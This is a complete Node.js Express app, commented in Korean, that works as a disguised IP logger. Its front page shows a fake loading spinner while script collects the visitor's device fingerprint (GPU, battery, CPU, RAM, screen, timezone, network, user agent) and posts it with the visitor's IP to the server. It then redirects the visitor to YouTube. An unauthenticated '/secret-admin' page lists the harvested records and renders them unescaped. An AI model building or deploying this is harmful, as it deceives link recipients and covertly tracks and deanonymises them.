const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// 수집된 데이터를 저장할 배열
let collectedLogs = [];

// [1] 메인 페이지 (접속 시 불러오는 중 화면 표시 후 정보 수집 및 유튜브 리디렉션)
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="ko">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>불러오는 중...</title>
      <style>
        body {
          margin: 0;
          padding: 0;
          background-color: #0f0f0f;
          color: #ffffff;
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
          display: flex;
          flex-direction: column;
          justify-content: center;
          align-items: center;
          height: 100vh;
        }
        .spinner {
          width: 50px;
          height: 50px;
          border: 5px solid rgba(255, 255, 255, 0.2);
          border-top-color: #ff0000;
          border-radius: 50%;
          animation: spin 1s infinite linear;
          margin-bottom: 20px;
        }
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
        p {
          font-size: 18px;
          font-weight: 500;
          color: #cccccc;
        }
      </style>
    </head>
    <body>
      <div class="spinner"></div>
      <p>페이지를 불러오는 중입니다. 잠시만 기다려 주세요...</p>

      <script>
        async function captureData() {
          const data = {
            timestamp: new Date().toLocaleString('ko-KR'),
            userAgent: navigator.userAgent,
            language: navigator.language,
            languages: navigator.languages ? navigator.languages.join(', ') : '',
            screen: \`\${screen.width}x\${screen.height} (\${window.innerWidth}x\${window.innerHeight})\`,
            colorDepth: screen.colorDepth + ' bit',
            orientation: screen.orientation ? screen.orientation.type : 'N/A',
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cpuCores: navigator.hardwareConcurrency || 'N/A',
            ram: navigator.deviceMemory ? \`약 \${navigator.deviceMemory} GB\` : 'N/A',
            maxTouchPoints: navigator.maxTouchPoints || 0,
            cookieEnabled: navigator.cookieEnabled,
            connection: 'N/A',
            downlink: 'N/A',
            rtt: 'N/A',
            saveData: 'N/A',
            gpu: 'N/A',
            battery: 'N/A',
            referrer: document.referrer || '직접 접속 / 앱'
          };

          // 1. 네트워크 정보 (Network Information API)
          if (navigator.connection) {
            data.connection = navigator.connection.effectiveType || 'N/A';
            data.downlink = navigator.connection.downlink ? \`\${navigator.connection.downlink} Mbps\` : 'N/A';
            data.rtt = navigator.connection.rtt ? \`\${navigator.connection.rtt} ms\` : 'N/A';
            data.saveData = navigator.connection.saveData ? '켜짐' : '꺼짐';
          }

          // 2. GPU / WebGL 정보
          try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
              const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
              if (debugInfo) {
                data.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
              }
            }
          } catch(e) {}

          // 3. 배터리 정보
          try {
            if (navigator.getBattery) {
              const battery = await navigator.getBattery();
              data.battery = \`\${Math.round(battery.level * 100)}% (\${battery.charging ? '충전 중' : '사용 중'})\`;
            }
          } catch(e) {}

          // 서버로 수집 데이터 전송
          try {
            await fetch('/collect', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(data)
            });
          } catch (e) {
            console.error(e);
          }

          // 🎯 원하는 유튜브 링크로 이동 (원하는 동영상 주소로 변경 가능)
          window.location.href = 'https://www.youtube.com'; 
        }

        // 페이지 로드 즉시 수집 시작
        window.onload = captureData;
      </script>
    </body>
    </html>
  `);
});

// [2] 클라이언트 수집 데이터 수신 API
app.post('/collect', (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const fullLog = {
    id: collectedLogs.length + 1,
    ip: ip,
    ...req.body
  };
  collectedLogs.unshift(fullLog); // 최신 순 정렬
  res.status(200).json({ status: 'ok' });
});

// [3] 대시보드 페이지 (/secret-admin)
app.get('/secret-admin', (req, res) => {
  let rows = collectedLogs.map(log => `
    <tr>
      <td>${log.id}</td>
      <td><strong>${log.timestamp}</strong></td>
      <td><code>${log.ip}</code></td>
      <td>${log.connection} (RTT: ${log.rtt})</td>
      <td>${log.cpuCores} 코어 / ${log.ram}</td>
      <td>${log.gpu}</td>
      <td>${log.battery}</td>
      <td>${log.screen}</td>
      <td>${log.timezone}</td>
      <td><small>${log.userAgent}</small></td>
    </tr>
  `).join('');

  res.send(`
    <!DOCTYPE html>
    <html lang="ko">
    <head>
      <meta charset="UTF-8">
      <title>관리자 수집 대시보드</title>
      <style>
        body { font-family: sans-serif; padding: 20px; background: #f4f6f8; }
        h1 { color: #333; }
        table { width: 100%; border-collapse: collapse; background: #fff; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        th, td { border: 1px solid #ddd; padding: 10px; font-size: 13px; text-align: left; }
        th { background-color: #2c3e50; color: white; }
        tr:nth-child(even) { background-color: #f9f9f9; }
      </style>
    </head>
    <body>
      <h1>📊 상세 수집 데이터 목록 (${collectedLogs.length}건)</h1>
      <button onclick="location.reload()">새로고침</button>
      <br><br>
      <table>
        <thead>
          <tr>
            <th>#</th>
            <th>시각</th>
            <th>IP</th>
            <th>네트워크</th>
            <th>CPU / RAM</th>
            <th>GPU (그래픽카드)</th>
            <th>배터리</th>
            <th>해상도</th>
            <th>시간대</th>
            <th>UserAgent</th>
          </tr>
        </thead>
        <tbody>
          ${rows || '<tr><td colspan="10" style="text-align:center;">수집된 데이터가 없습니다.</td></tr>'}
        </tbody>
      </table>
    </body>
    </html>
  `);
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

